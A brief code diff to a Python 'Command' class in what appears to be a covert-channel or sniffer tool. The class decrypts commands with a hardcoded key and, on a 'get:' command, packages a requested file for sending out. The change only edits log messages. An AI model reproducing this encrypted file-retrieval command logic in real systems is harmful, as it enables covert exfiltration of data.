@@ -18,7 +18,7 @@ class Command:
     def execute(self):
         """ Executes the command based on the type of command. """
         decrypted = decrypt(self.cmd, "secret")
-        print("decrypted: " + decrypted)
+        print("[Sniffer] Received command: " + decrypted)
         
         if decrypted.startswith("get:"):
             file_path = decrypted[decrypted.index(":") + 1:]
@@ -26,8 +26,6 @@ class Command:
 
             mimetype = mimetypes.guess_type(file_path)[0]
             head_data = "1" if mimetype != None and mimetype.startswith("text/") else "0"
-
-            print("mimetype: " + mimetype)
 
             # send HEAD request
             head = Request(RequestType.DATA)
